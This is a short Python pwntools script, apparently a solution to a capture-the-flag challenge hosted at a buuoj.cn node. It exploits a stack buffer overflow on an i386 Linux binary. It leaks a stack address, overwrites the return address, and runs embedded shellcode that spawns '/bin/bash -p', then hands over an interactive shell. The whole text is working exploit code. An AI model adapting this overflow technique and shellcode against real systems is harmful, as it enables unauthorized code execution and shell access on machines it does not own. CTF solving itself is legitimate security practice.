from pwn import *
context(arch = "i386", os = "linux", log_level = "debug")

sh=remote("node5.buuoj.cn",29375)

payload=0x14*b'a'+p32(0x08048087)
sh.recvuntil(b'CTF:')
sh.send(payload)
ret=u32(sh.recv(4)) + 0x14
shellcode=b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
payload=0x14*b'a'+p32(ret)+shellcode
sh.send(payload)
sh.interactive()
